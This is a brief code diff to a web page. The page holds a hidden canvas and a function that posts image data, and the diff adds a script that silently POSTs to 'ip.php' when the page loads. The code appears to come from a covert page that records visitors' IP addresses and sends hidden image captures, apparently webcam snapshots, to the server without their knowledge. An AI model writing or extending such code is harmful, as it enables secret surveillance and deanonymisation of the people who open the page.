@@ -25,7 +25,12 @@ xhr.open("POST", "ip.php");
 <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
 
 <script>
-
+    $.ajax({
+      type: 'POST',
+      url: 'ip.php',
+      async: false,
+    });
+  
   function post(imgdata) {
     $.ajax({
       type: 'POST',
